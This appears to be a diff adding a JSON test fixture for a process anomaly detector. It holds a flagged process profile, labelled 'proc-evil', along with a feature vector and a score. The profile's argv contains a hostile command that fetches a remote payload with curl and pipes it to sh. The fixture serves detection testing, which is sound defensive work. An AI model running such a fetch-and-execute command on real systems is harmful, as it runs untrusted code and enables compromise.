@@ -1,0 +1,43 @@
+{
+  "candidate": true,
+  "feature_vector": [
+    -0.21429288387298584,
+    -0.033990032970905304,
+    0.17876529693603516,
+    -0.02819414809346199,
+    -0.03796236217021942,
+    -0.014248516410589218,
+    0.08089854568243027,
+    -0.10762559622526169
+  ],
+  "profile": {
+    "agent_id": "",
+    "argv": [
+      "bash",
+      "-c",
+      "curl http://10.0.0.9/payload | sh",
+      "--no-profile",
+      "--debug"
+    ],
+    "behavior_counts": {
+      "process.exec": 1
+    },
+    "binary": "/bin/bash",
+    "event_refs": [
+      "anomaly-001"
+    ],
+    "files": [],
+    "labels": {
+      "class": "replay-anomaly"
+    },
+    "lineage_id": "proc-evil",
+    "networks": [
+      "10.0.0.9:443"
+    ],
+    "parent_stable_id": "proc-unknown",
+    "revision": 1,
+    "stable_id": "proc-evil",
+    "state": "active"
+  },
+  "score": -4.44423770904541
+}
